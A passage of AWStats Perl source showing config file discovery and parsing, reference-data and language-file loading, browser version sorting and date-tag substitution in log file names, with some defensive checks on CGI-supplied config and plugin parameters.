    if ($payload <= 1024) { return $PayloadRange[3]; }
    if ($payload <= 2048) { return $PayloadRange[4]; }
    if ($payload <= 5120) { return $PayloadRange[5]; }
    return $PayloadRange[6];
}

#------------------------------------------------------------------------------
# Function:     Return string of Request Time Range
# Parameters:   $starttime $endtime
# Input:        None
# Output:       None
# Return:       A string that identify the time range
#------------------------------------------------------------------------------
sub GetRequestTimeRange {
    my $rqtime = shift;
    if ($Debug) { debug("GetRequestTimeRange $rqtime",4); }
    if ($rqtime <= 44)   { return $TimeRange[0]; }
    if ($rqtime <= 100)  { return $TimeRange[1]; }
    if ($rqtime <= 500)  { return $TimeRange[2]; }
    if ($rqtime <= 1024) { return $TimeRange[3]; }
    if ($rqtime <= 2048) { return $TimeRange[4]; }
    if ($rqtime <= 5120) { return $TimeRange[5]; }
    return $TimeRange[6];
}

#------------------------------------------------------------------------------
# Function:     Compare two browsers version
# Parameters:	$a
# Input:        None
# Output:		None
# Return:		-1, 0, 1
#------------------------------------------------------------------------------
sub SortBrowsers {
    my $a_family = $a;
    my @a_ver    = ();
    foreach my $family ( keys %BrowsersFamily ) {
        if ( $a =~ /^$family/i ) {
            $a =~ m/^(\D+)([\d\.]+)?$/;
            $a_family = $1;
            @a_ver = split( /\./, $2 );
        }
    }
    my $b_family = $b;
    my @b_ver    = ();
    foreach my $family ( keys %BrowsersFamily ) {
        if ( $b =~ /^$family/i ) {
            $b =~ m/^(\D+)([\d\.]+)?$/;
            $b_family = $1;
            @b_ver = split( /\./, $2 );
        }
    }

    my $compare = 0;
    my $done    = 0;

    $compare = $a_family cmp $b_family;
    if ( $compare != 0 ) {
        return $compare;
    }

    while ( !$done ) {
        my $a_num = shift @a_ver || 0;
        my $b_num = shift @b_ver || 0;

        $compare = $a_num <=> $b_num;
        if ( $compare != 0
            || ( scalar(@a_ver) == 0 && scalar(@b_ver) == 0 && $compare == 0 ) )
        {
            $done = 1;
        }
    }

    return $compare;
}

#------------------------------------------------------------------------------
# Function:     Read config file
# Parameters:	None or configdir to scan
# Input:        $DIR $PROG $SiteConfig
# Output:		Global variables
# Return:		-
#------------------------------------------------------------------------------
sub Read_Config {

    # Check config file in common possible directories :
    # Windows :                   				"$DIR" (same dir than awstats.pl)
    # Standard, Mandrake and Debian package :	"/etc/awstats"
    # Other possible directories :				"/usr/local/etc/awstats",
    # FHS standard, Suse package : 				"/etc/opt/awstats"
    my $configdir         = shift;
    my @PossibleConfigDir = (
        "$DIR",
        "/etc/awstats",
        "/usr/local/etc/awstats",
        "/etc/opt/awstats"
    );

    if ($configdir) {
        # Check if configdir is outside default values.
        my $outsidedefaultvalue=1;
        foreach (@PossibleConfigDir) {
            if ($_ eq $configdir) { $outsidedefaultvalue=0; last; }
        }

        # If from CGI, overwriting of configdir with a value that differs from a default value
        # is only possible if AWSTATS_ENABLE_CONFIG_DIR defined.
        # AWSTATS_ENABLE_CONFIG_DIR must contains dir allowed
        if ($ENV{'GATEWAY_INTERFACE'} && $outsidedefaultvalue)
        {
            if (! $ENV{"AWSTATS_ENABLE_CONFIG_DIR"})
            {
                error("Sorry, to allow overwriting of configdir parameter, from an AWStats CGI page, with a non default value, environment variable AWSTATS_ENABLE_CONFIG_DIR must be set to full path of allowed directory. For example, by adding the line 'SetEnv AWSTATS_ENABLE_CONFIG_DIR /mydirofconf' in your Apache config file or into a .htaccess file.");
            }
            else
            {
                if ($configdir !~ $ENV{"AWSTATS_ENABLE_CONFIG_DIR"})
                {
                    error("Sorry, using configdir parameter from an AWStats CGI page is possible only if parameter configdir is a directory defined into environment variable AWSTATS_ENABLE_CONFIG_DIR");
                }
            }
        }

        @PossibleConfigDir = ("$configdir");
    }

    # Open config file
    $FileConfig = $FileSuffix = '';
    foreach (@PossibleConfigDir) {
        my $searchdir = $_;
        if ( $searchdir && $searchdir !~ /[\\\/]$/ ) { $searchdir .= "/"; }

        if ( -f $searchdir.$PROG.".".$SiteConfig.".conf" &&  open( CONFIG, "<$searchdir$PROG.$SiteConfig.conf" ) ) {
            $FileConfig = "$searchdir$PROG.$SiteConfig.conf";
            $FileSuffix = ".$SiteConfig";
            if ($Debug){debug("Opened config: $searchdir$PROG.$SiteConfig.conf", 2);}
            last;
        }else{if ($Debug){debug("Unable to open config file: $searchdir$PROG.$SiteConfig.conf", 2);}}

        if ( -f $searchdir.$PROG.".conf" &&  open( CONFIG, "$searchdir$PROG.conf" ) ) {
            $FileConfig = "$searchdir$PROG.conf";
            $FileSuffix = '';
            if ($Debug){debug("Opened config: $searchdir$PROG.conf", 2);}
            last;
        }else{if ($Debug){debug("Unable to open config file: $searchdir$PROG.conf", 2);}}

        # Added to open config if file name is passed to awstats
        if ( -f $searchdir.$SiteConfig && open( CONFIG, "$searchdir$SiteConfig" ) ) {
            $FileConfig = "$searchdir$SiteConfig";
            $FileSuffix = '';
            if ($Debug){debug("Opened config: $searchdir$SiteConfig", 2);}
            last;
        }else{if ($Debug){debug("Unable to open config file: $searchdir$SiteConfig", 2);}}
    }

    #CL - Added to open config if full path is passed to awstats
    # Disabled by LDR for security reason.
    # If we need to execute config into other dir
    #if ( !$FileConfig ) {
    #
    #	my $SiteConfigBis = File::Spec->rel2abs($SiteConfig);
    #	debug("Finally, try to open an absolute path : $SiteConfigBis", 2);
    #
    #	if ( -f $SiteConfigBis && open(CONFIG, "$SiteConfigBis")) {
    #		$FileConfig = "$SiteConfigBis";
    #		$FileSuffix = '';
    #		if ($Debug){debug("Opened config: $SiteConfigBis", 2);}
    #		$SiteConfig=$SiteConfigBis;
    #	}
    #	else {
    #		if ($Debug){debug("Unable to open config file: $SiteConfigBis", 2);}
    #	}
    #}

    if ( !$FileConfig ) {
        if ($DEBUGFORCED || !$ENV{'GATEWAY_INTERFACE'}){
            error(
                "Couldn't open config file \"$PROG.$SiteConfig.conf\", nor \"$PROG.conf\", nor \"$SiteConfig\" after searching in path \""
                    . join( ', ', @PossibleConfigDir )
                    . ", $SiteConfig\": $!" );
        }else{error("Couldn't open config file \"$PROG.$SiteConfig.conf\" nor \"$PROG.conf\".
		Please read the documentation for directories where the configuration file should be located."); }
    }

    # Analyze config file content and close it
    &Parse_Config( *CONFIG, 1, $FileConfig );
    close CONFIG;

    # If parameter NotPageList not found, init for backward compatibility
    if ( !$FoundNotPageList ) {
        %NotPageList = (
            'css'   => 1,
            'js'    => 1,
            'class' => 1,
            'gif'   => 1,
            'jpg'   => 1,
            'jpeg'  => 1,
            'png'   => 1,
            'bmp'   => 1,
            'ico'   => 1,
            'rss'   => 1,
            'swf'   => 1,
            'webp'  => 1,
            'xml'   => 1,
            'eot'   => 1,
            'woff'  => 1,
            'woff2' => 1
        );
    }

    # If parameter ValidHTTPCodes empty, init for backward compatibility
    if ( !scalar keys %ValidHTTPCodes ) {
        $ValidHTTPCodes{"200"} = $ValidHTTPCodes{"304"} = 1;
    }

    # If parameter ValidSMTPCodes empty, init for backward compatibility
    if ( !scalar keys %ValidSMTPCodes ) {
        $ValidSMTPCodes{"1"} = $ValidSMTPCodes{"250"} = 1;
    }

    # If parameter TrapInfosForHTTPErrorCodes empty, init to default
    if ( !scalar keys %TrapInfosForHTTPErrorCodes ) {
        $TrapInfosForHTTPErrorCodes{"404"} = 1;
    }
}

#------------------------------------------------------------------------------
# Function:     Parse content of a config file
# Parameters:	opened file handle, depth level, file name
# Input:        -
# Output:		Global variables
# Return:		-
#------------------------------------------------------------------------------
sub Parse_Config {
    my ($confighandle) = $_[0];
    my $level          = $_[1];
    my $configFile     = $_[2];
    my $versionnum     = 0;
    my $conflinenb     = 0;

    if ( $level > 10 ) {
        error(
            "$PROG can't read down more than 10 level of includes. Check that no 'included' config files include their parent config file (this cause infinite loop)."
        );
    }

    while (<$confighandle>) {
        chomp $_;
        s/\r//;
        $conflinenb++;

        # Extract version from first line
        if ( !$versionnum && $_ =~ /^# AWSTATS CONFIGURE FILE (\d+).(\d+)/i ) {
            $versionnum = ( $1 * 1000 ) + $2;

            #if ($Debug) { debug(" Configure file version is $versionnum",1); }
            next;
        }

        if ( $_ =~ /^\s*$/ ) { next; }

        # Check includes
        if ( $_ =~ /^Include "([^\"]+)"/ || $_ =~ /^#include "([^\"]+)"/ )
        {    # #include kept for backward compatibility
            my $includeFile = $1;

            # Expand __var__ by values
            while ( $includeFile =~ /__([^\s_]+(?:_[^\s_]+)*)__/ ) {
                my $var = $1;
                $includeFile =~ s/__${var}__/$ENV{$var}/g;
            }
            if ($Debug) { debug( "Found an include : $includeFile", 2 ); }
            if ( $includeFile !~ /^([a-zA-Z]:)?[\\\/]/ ) {
                # Correct relative include files
                if ( $FileConfig =~ /^(.*[\\\/])[^\\\/]*$/ ) {
                    $includeFile = "$1$includeFile";
                }
            }
            if ( $level > 1 && $^V lt v5.6.0 ) {
                warning(
                    "Warning: Perl versions before 5.6 cannot handle nested includes"
                );
                next;
            }
            local( *CONFIG_INCLUDE );   # To avoid having parent file closed when include file is closed
            if ( open( CONFIG_INCLUDE, "<$includeFile" ) ) {
                &Parse_Config( *CONFIG_INCLUDE, $level + 1, $includeFile );
                close(CONFIG_INCLUDE);
            }
            else {
                error("Could not open include file: $includeFile");
            }
            next;
        }

        # Remove comments
        if ( $_ =~ /^\s*#/ ) { next; }
        $_ =~ s/\s#.*$//;

        # Extract param and value
        my ( $param, $value ) = split( /=/, $_, 2 );
        $param =~ s/^\s+//;
        $param =~ s/\s+$//;

        # If not a param=value, try with next line
        if ( !$param ) {
            warning(
                "Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
            );
            next;
        }
        if ( !defined $value ) {
            warning(
                "Warning: Syntax error line $conflinenb in file '$configFile'. Config line is ignored."
            );
            next;
        }

        if ($value) {
            $value =~ s/^\s+//;
            $value =~ s/\s+$//;
            $value =~ s/^\"//;
            $value =~ s/\";?$//;

            # Replace __MONENV__ with value of environnement variable MONENV
            # Must be able to replace __VAR_1____VAR_2__
            while ( $value =~ /__([^\s_]+(?:_[^\s_]+)*)__/ ) {
                my $var = $1;
                $value =~ s/__${var}__/$ENV{$var}/g;
            }
        }

        # Initialize parameter for (param,value)
        if ( $param =~ /^LogFile/ ) {
            if ( $QueryString !~ /logfile=([^\s&]+)/i ) { $LogFile = $value; }
            next;
        }
        if ( $param =~ /^DirIcons/ ) {
            if ( $QueryString !~ /diricons=([^\s&]+)/i ) { $DirIcons = $value; }
            next;
        }
        if ( $param =~ /^SiteDomain/ ) {

            # No regex test as SiteDomain is always exact value
            $SiteDomain = $value;

            if ($SiteDomain =~ m/xn--/)
            {
                # TODO Add code to test if IDNA::Punycode module is on
                #use IDNA::Punycode;
                $DecodePunycode=0;	# Set to 1 if module is on
                if ($DecodePunycode)
                {
                    idn_prefix(undef);
                    my @parts = split(/\./, $SiteDomain);
                    foreach (@parts) {
                        if ($_ =~ s/^xn--//) {
                            eval { $_ = decode_punycode($_); };
                            if (my $e = $@) { $_ = $e; }
                        }
                    }
                    $SiteDomain = join('.', @parts);
                }
            }

            next;
        }
        if ( $param =~ /^AddLinkToExternalCGIWrapper/ ) {

            # No regex test as AddLinkToExternalCGIWrapper is always exact value
            $AddLinkToExternalCGIWrapper = $value;
            next;
        }
        if ( $param =~ /^HostAliases/ ) {
            @HostAliases = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ s/^\@// ) {    # If list of hostaliases in a file
                    open( DATAFILE, "<$elem" )
                        || error(
                        "Failed to open file '$elem' declared in HostAliases parameter"
                    );
                    my @val = map( /^(.*)$/i, <DATAFILE> );
                    push @HostAliases, map { qr/^$_$/i } @val;
                    close(DATAFILE);
                }
                else {
                    if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                    else { $elem = '^' . quotemeta($elem) . '$'; }
                    if ($elem) { push @HostAliases, qr/$elem/i; }
                }
            }
            next;
        }

        # Special optional setup params
        if ( $param =~ /^SkipDNSLookupFor/ ) {
            @SkipDNSLookupFor = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @SkipDNSLookupFor, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^AllowAccessFromWebToFollowingAuthenticatedUsers/ ) {
            @AllowAccessFromWebToFollowingAuthenticatedUsers = ();
            foreach ( split( /\s+/, $value ) ) {
                push @AllowAccessFromWebToFollowingAuthenticatedUsers, $_;
            }
            next;
        }
        if ( $param =~ /^DefaultFile/ ) {
            @DefaultFile = ();
            foreach my $elem ( split( /\s+/, $value ) ) {

                # No REGEX for this option
                #if ($elem =~ /^REGEX\[(.*)\]$/i) { $elem=$1; }
                #else { $elem='^'.quotemeta($elem).'$'; }
                if ($elem) { push @DefaultFile, $elem; }
            }
            next;
        }
        if ( $param =~ /^SkipHosts/ ) {
            @SkipHosts = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @SkipHosts, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^SkipReferrersBlackList/ && $value ) {
            open( BLACKLIST, "<$value" )
                || die "Failed to open blacklist: $!\n";
            while (<BLACKLIST>) {
                chomp;
                my $elem = $_;
                $elem =~ s/ //;
                $elem =~ s/\#.*//;
                if ($elem) { push @SkipReferrers, qr/$elem/i; }
            }
            next;
            close(BLACKLIST);
        }
        if ( $param =~ /^SkipUserAgents/ ) {
            @SkipUserAgents = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @SkipUserAgents, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^SkipFiles/ ) {
            @SkipFiles = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @SkipFiles, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^OnlyHosts/ ) {
            @OnlyHosts = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @OnlyHosts, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^OnlyUsers/ ) {
            @OnlyUsers = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @OnlyUsers, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^OnlyUserAgents/ ) {
            @OnlyUserAgents = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @OnlyUserAgents, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^OnlyFiles/ ) {
            @OnlyFiles = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @OnlyFiles, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^NotPageFiles/ ) {
            @NotPageFiles = ();
            foreach my $elem ( split( /\s+/, $value ) ) {
                if ( $elem =~ /^REGEX\[(.*)\]$/i ) { $elem = $1; }
                else { $elem = '^' . quotemeta($elem) . '$'; }
                if ($elem) { push @NotPageFiles, qr/$elem/i; }
            }
            next;
        }
        if ( $param =~ /^NotPageList/ ) {
            %NotPageList = ();
            foreach ( split( /\s+/, $value ) ) { $NotPageList{$_} = 1; }
            $FoundNotPageList = 1;
            next;
        }
        if ( $param =~ /^ValidHTTPCodes/ ) {
            %ValidHTTPCodes = ();
            foreach ( split( /\s+/, $value ) ) { $ValidHTTPCodes{$_} = 1; }
            next;
        }
        if ( $param =~ /^ValidSMTPCodes/ ) {
            %ValidSMTPCodes = ();
            foreach ( split( /\s+/, $value ) ) { $ValidSMTPCodes{$_} = 1; }
            next;
        }
        if ( $param =~ /^TrapInfosForHTTPErrorCodes/ ) {
            %TrapInfosForHTTPErrorCodes = ();
            foreach ( split( /\s+/, $value ) ) { $TrapInfosForHTTPErrorCodes{$_} = 1; }
            next;
        }
        if ( $param =~ /^URLWithQueryWithOnlyFollowingParameters$/ ) {
            @URLWithQueryWithOnly = split( /\s+/, $value );
            next;
        }
        if ( $param =~ /^URLWithQueryWithoutFollowingParameters$/ ) {
            @URLWithQueryWithout = split( /\s+/, $value );
            next;
        }

        # Extra parameters
        if ( $param =~ /^ExtraSectionName(\d+)/ ) {
            $ExtraName[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionCodeFilter(\d+)/ ) {
            @{ $ExtraCodeFilter[$1] } = split( /\s+/, $value );
            next;
        }
        if ( $param =~ /^ExtraSectionCondition(\d+)/ ) {
            $ExtraCondition[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionStatTypes(\d+)/ ) {
            $ExtraStatTypes[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionFirstColumnTitle(\d+)/ ) {
            $ExtraFirstColumnTitle[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionFirstColumnValues(\d+)/ ) {
            $ExtraFirstColumnValues[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionFirstColumnFunction(\d+)/ ) {
            $ExtraFirstColumnFunction[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionFirstColumnFormat(\d+)/ ) {
            $ExtraFirstColumnFormat[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionAddAverageRow(\d+)/ ) {
            $ExtraAddAverageRow[$1] = $value;
            next;
        }
        if ( $param =~ /^ExtraSectionAddSumRow(\d+)/ ) {
            $ExtraAddSumRow[$1] = $value;
            next;
        }
        if ( $param =~ /^MaxNbOfExtra(\d+)/ ) {
            $MaxNbOfExtra[$1] = $value;
            next;
        }
        if ( $param =~ /^MinHitExtra(\d+)/ ) {
            $MinHitExtra[$1] = $value;
            next;
        }

        # Plugins
        if ( $param =~ /^LoadPlugin/ ) {
            $value =~ s/[^a-zA-Z0-9_\/\.\+:=\?\s%\-]//g;		# Sanitize plugin name and string param because it is used later in an eval.
            push @PluginsToLoad, $value; next;
        }

        # Other parameter checks we need to put after MaxNbOfExtra and MinHitExtra
        if ( $param =~ /^MaxNbOf(\w+)/ ) { $MaxNbOf{$1} = $value; next; }
        if ( $param =~ /^MinHit(\w+)/ )  { $MinHit{$1}  = $value; next; }

        # Check if this is a known parameter
        #		if (! $ConfOk{$param}) { error("Unknown config parameter '$param' found line $conflinenb in file \"configFile\""); }
        # If parameters was not found previously, defined variable with name of param to value
        $$param = $value;
    }

    if ($Debug) {
        debug("Config file read was \"$configFile\" (level $level)");
    }
}

#------------------------------------------------------------------------------
# Function:     Load the reference databases
# Parameters:	List of files to load
# Input:		$DIR
# Output:		Arrays and Hash tables are defined
# Return:       -
#------------------------------------------------------------------------------
sub Read_Ref_Data {

    # Check lib files in common possible directories :
    # Windows and standard package:        		"$DIR/lib" (lib in same dir than awstats.pl)
    # Debian package:                    		"/usr/share/awstats/lib"
    my @PossibleLibDir = ( "$DIR/lib", "/usr/share/awstats/lib" );
    my %FilePath       = ();
    my %DirAddedInINC  = ();
    my @FileListToLoad = ();
    while ( my $file = shift ) { push @FileListToLoad, "$file.pm"; }
    if ($Debug) {
        debug( "Call to Read_Ref_Data with files to load: "
            . ( join( ',', @FileListToLoad ) ) );
    }
    foreach my $file (@FileListToLoad) {
        foreach my $dir (@PossibleLibDir) {
            my $searchdir = $dir;
            if (   $searchdir
                && ( !( $searchdir =~ /\/$/ ) )
                && ( !( $searchdir =~ /\\$/ ) ) )
            {
                $searchdir .= "/";
            }
            if ( !$FilePath{$file} )
            {    # To not load twice same file in different path
                if ( -s "${searchdir}${file}" ) {
                    $FilePath{$file} = "${searchdir}${file}";
                    if ($Debug) {
                        debug(
                            "Call to Read_Ref_Data [FilePath{$file}=\"$FilePath{$file}\"]"
                        );
                    }

                    # Note: cygwin perl 5.8 need a push + require file
                    if ( !$DirAddedInINC{"$dir"} ) {
                        push @INC, "$dir";
                        $DirAddedInINC{"$dir"} = 1;
                    }
                    my $loadret = require "$file";

                    #my $loadret=(require "$FilePath{$file}"||require "${file}");
                }
            }
        }
        if ( !$FilePath{$file} ) {
            my $filetext = $file;
            $filetext =~ s/\.pm$//;
            $filetext =~ s/_/ /g;
            warning(
                "Warning: Can't read file \"$file\" ($filetext detection will not work correctly).\nCheck if file is in \""
                    . ( $PossibleLibDir[0] )
                    . "\" directory and is readable." );
        }
    }

    # Sanity check (if loaded)
    if ( ( scalar keys %OSHashID )
        && @OSSearchIDOrder != scalar keys %OSHashID )
    {
        error(  "Not same number of records of OSSearchIDOrder ("
            . (@OSSearchIDOrder)
            . " entries) and OSHashID ("
            . ( scalar keys %OSHashID )
            . " entries) in OS database. Check your file "
            . $FilePath{"operating_systems.pm"} );
    }
    if (
        ( scalar keys %SearchEnginesHashID )
            && ( @SearchEnginesSearchIDOrder_list1 +
            @SearchEnginesSearchIDOrder_list2 +
            @SearchEnginesSearchIDOrder_listgen ) != scalar
            keys %SearchEnginesHashID
    )
    {
        error(
            "Not same number of records of SearchEnginesSearchIDOrder_listx (total is "
                . (
                @SearchEnginesSearchIDOrder_list1 +
                    @SearchEnginesSearchIDOrder_list2 +
                    @SearchEnginesSearchIDOrder_listgen
            )
                . " entries) and SearchEnginesHashID ("
                . ( scalar keys %SearchEnginesHashID )
                . " entries) in Search Engines database. Check your file "
                . $FilePath{"search_engines.pm"}
                . " is up to date."
        );
    }
    if ( ( scalar keys %BrowsersHashIDLib )
        && @BrowsersSearchIDOrder != ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )
    {
        #foreach (sort keys %BrowsersHashIDLib)
        #{
        #	print $_."\n";
        #}
        #foreach (sort @BrowsersSearchIDOrder)
        #{
        #	print $_."\n";
        #}
        error(  "Not same number of records of BrowsersSearchIDOrder ("
            . (@BrowsersSearchIDOrder)
            . " entries) and BrowsersHashIDLib ("
            . ( ( scalar keys %BrowsersHashIDLib ) - ( scalar keys %BrowsersFamily ) )
            . " entries without firefox,opera,chrome,safari,konqueror,svn,msie,netscape,edge) in Browsers database. May be you updated AWStats without updating browsers.pm file or you made changed into browsers.pm not correctly. Check your file "
            . $FilePath{"browsers.pm"}
            . " is up to date." );
    }
    if (
        ( scalar keys %RobotsHashIDLib )
            && ( @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
            @RobotsSearchIDOrder_listgen ) !=
            ( scalar keys %RobotsHashIDLib ) - 1
    )
    {
        error(
            "Not same number of records of RobotsSearchIDOrder_listx (total is "
                . (
                @RobotsSearchIDOrder_list1 + @RobotsSearchIDOrder_list2 +
                    @RobotsSearchIDOrder_listgen
            )
                . " entries) and RobotsHashIDLib ("
                . ( ( scalar keys %RobotsHashIDLib ) - 1 )
                . " entries without 'unknown') in Robots database. Check your file "
                . $FilePath{"robots.pm"}
                . " is up to date."
        );
    }
}

#------------------------------------------------------------------------------
# Function:     Get the messages for a specified language
# Parameters:	LanguageId
# Input:		$DirLang $DIR
# Output:		$Message table is defined in memory
# Return:		None
#------------------------------------------------------------------------------
sub Read_Language_Data {

    # Check lang files in common possible directories :
    # Windows and standard package:         	"$DIR/lang" (lang in same dir than awstats.pl)
    # Debian package :                    		"/usr/share/awstats/lang"
    my @PossibleLangDir =
        ( "$DirLang", "$DIR/lang", "/usr/share/awstats/lang" );

    my $FileLang = '';
    foreach (@PossibleLangDir) {
        my $searchdir = $_;
        if ( $searchdir =~ /\|/ )		# We refuse path that contains "|"
        {
            error("DirLang parameter can't contains character |");
            next;
        }
        if ( $searchdir
            && ( !( $searchdir =~ /\/$/ ) )
            && ( !( $searchdir =~ /\\$/ ) ) )
        {
            $searchdir .= "/";
        }
        if ( open( LANG, "${searchdir}awstats-$_[0].txt" ) ) {
            $FileLang = "${searchdir}awstats-$_[0].txt";
            last;
        }
    }

    # If file not found, we try english
    if ( !$FileLang ) {
        foreach (@PossibleLangDir) {
            my $searchdir = $_;
            if (   $searchdir
                && ( !( $searchdir =~ /\/$/ ) )
                && ( !( $searchdir =~ /\\$/ ) ) )
            {
                $searchdir .= "/";
            }
            if ( open( LANG, "${searchdir}awstats-en.txt" ) ) {
                $FileLang = "${searchdir}awstats-en.txt";
                last;
            }
        }
    }
    if ($Debug) {
        debug("Call to Read_Language_Data [FileLang=\"$FileLang\"]");
    }
    if ($FileLang) {
        my $i = 0;
        binmode LANG;    # Might avoid 'Malformed UTF-8 errors'
        my $cregcode    = qr/^PageCode=[\t\s\"\']*([\w-]+)/i;
        my $cregdir     = qr/^PageDir=[\t\s\"\']*([\w-]+)/i;
        my $cregmessage = qr/^Message\d+=/i;
        while (<LANG>) {
            chomp $_;
            s/\r//;
            if ( $_ =~ /$cregcode/o ) { $PageCode = $1; }
            if ( $_ =~ /$cregdir/o )  { $PageDir  = $1; }
            if ( $_ =~ s/$cregmessage//o ) {
                $_ =~ s/^#.*//;       # Remove comments
                $_ =~ s/\s+#.*//;     # Remove comments
                $_ =~ tr/\t /  /s;    # Change all blanks into " "
                $_ =~ s/^\s+//;
                $_ =~ s/\s+$//;
                $_ =~ s/^\"//;
                $_ =~ s/\"$//;
                $Message[$i] = $_;
                $i++;
            }
        }
        close(LANG);
    }
    else {
        warning(
            "Warning: Can't find language files for \"$_[0]\". English will be used."
        );
    }

    # Some language string changes
    if ( $LogType eq 'M' ) {    # For mail
        $Message[8]  = $Message[151];
        $Message[9]  = $Message[152];
        $Message[57] = $Message[149];
        $Message[75] = $Message[150];
    }
    if ( $LogType eq 'F' ) {    # For web

    }
}

#------------------------------------------------------------------------------
# Function:     Substitute date tags in a string by value
# Parameters:	String
# Input:		All global variables
# Output:		Change on some global variables
# Return:		String
#------------------------------------------------------------------------------
sub Substitute_Tags {
    my $SourceString = shift;
    if ($Debug) { debug("Call to Substitute_Tags on $SourceString"); }

    my %MonthNumLibEn = (
        "01", "Jan", "02", "Feb", "03", "Mar", "04", "Apr",
        "05", "May", "06", "Jun", "07", "Jul", "08", "Aug",
        "09", "Sep", "10", "Oct", "11", "Nov", "12", "Dec"
    );

    while ( $SourceString =~ /%([ymdhwYMDHWNSO]+)-(\(\d+\)|\d+)/ ) {

        # Accept tag %xx-dd and %xx-(dd)
        my $timetag     = "$1";
        my $timephase   = quotemeta("$2");
        my $timephasenb = "$2";
        $timephasenb =~ s/[^\d]//g;
        if ($Debug) {
            debug(
                " Found a time tag '$timetag' with a phase of '$timephasenb' hour in log file name",
                1
            );
        }

        # Get older time
        my (
            $oldersec,   $oldermin,  $olderhour, $olderday,
            $oldermonth, $olderyear, $olderwday, $olderyday
        )
            = localtime( $starttime - ( $timephasenb * 3600 ) );
        my $olderweekofmonth = int( $olderday / 7 );
        my $olderweekofyear  =
            int(
                ( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /
                    7 ) + 1;
        if ( $olderweekofyear > 53 ) { $olderweekofyear = 1; }
        my $olderdaymod = $olderday % 7;
        $olderwday++;
        my $olderns =
            Time::Local::timegm( 0, 0, 0, $olderday, $oldermonth, $olderyear );

        if ( $olderdaymod <= $olderwday ) {
            if ( ( $olderwday != 7 ) || ( $olderdaymod != 0 ) ) {
                $olderweekofmonth = $olderweekofmonth + 1;
            }
        }
        if ( $olderdaymod > $olderwday ) {
            $olderweekofmonth = $olderweekofmonth + 2;
        }

        # Change format of time variables
        $olderweekofmonth = "0$olderweekofmonth";
        if ( $olderweekofyear < 10 ) { $olderweekofyear = "0$olderweekofyear"; }
        if ( $olderyear < 100 ) { $olderyear += 2000; }
        else { $olderyear += 1900; }
        my $oldersmallyear = $olderyear;
        $oldersmallyear =~ s/^..//;
        if ( ++$oldermonth < 10 ) { $oldermonth = "0$oldermonth"; }
        if ( $olderday < 10 )     { $olderday   = "0$olderday"; }
        if ( $olderhour < 10 )    { $olderhour  = "0$olderhour"; }
        if ( $oldermin < 10 )     { $oldermin   = "0$oldermin"; }
        if ( $oldersec < 10 )     { $oldersec   = "0$oldersec"; }

        # Replace tag with new value
        if ( $timetag eq 'YYYY' ) {
            $SourceString =~ s/%YYYY-$timephase/$olderyear/ig;
            next;
        }
        if ( $timetag eq 'YY' ) {
            $SourceString =~ s/%YY-$timephase/$oldersmallyear/ig;
            next;
        }
        if ( $timetag eq 'MM' ) {
            $SourceString =~ s/%MM-$timephase/$oldermonth/ig;
            next;
        }
        if ( $timetag eq 'MO' ) {
            $SourceString =~ s/%MO-$timephase/$MonthNumLibEn{$oldermonth}/ig;
            next;
        }
        if ( $timetag eq 'DD' ) {
            $SourceString =~ s/%DD-$timephase/$olderday/ig;
            next;
        }
        if ( $timetag eq 'HH' ) {
            $SourceString =~ s/%HH-$timephase/$olderhour/ig;
            next;
        }
        if ( $timetag eq 'NS' ) {
            $SourceString =~ s/%NS-$timephase/$olderns/ig;
            next;
        }
        if ( $timetag eq 'WM' ) {
            $SourceString =~ s/%WM-$timephase/$olderweekofmonth/g;
            next;
        }
        if ( $timetag eq 'Wm' ) {
            my $olderweekofmonth0 = $olderweekofmonth - 1;
            $SourceString =~ s/%Wm-$timephase/$olderweekofmonth0/g;
            next;
        }
        if ( $timetag eq 'WY' ) {
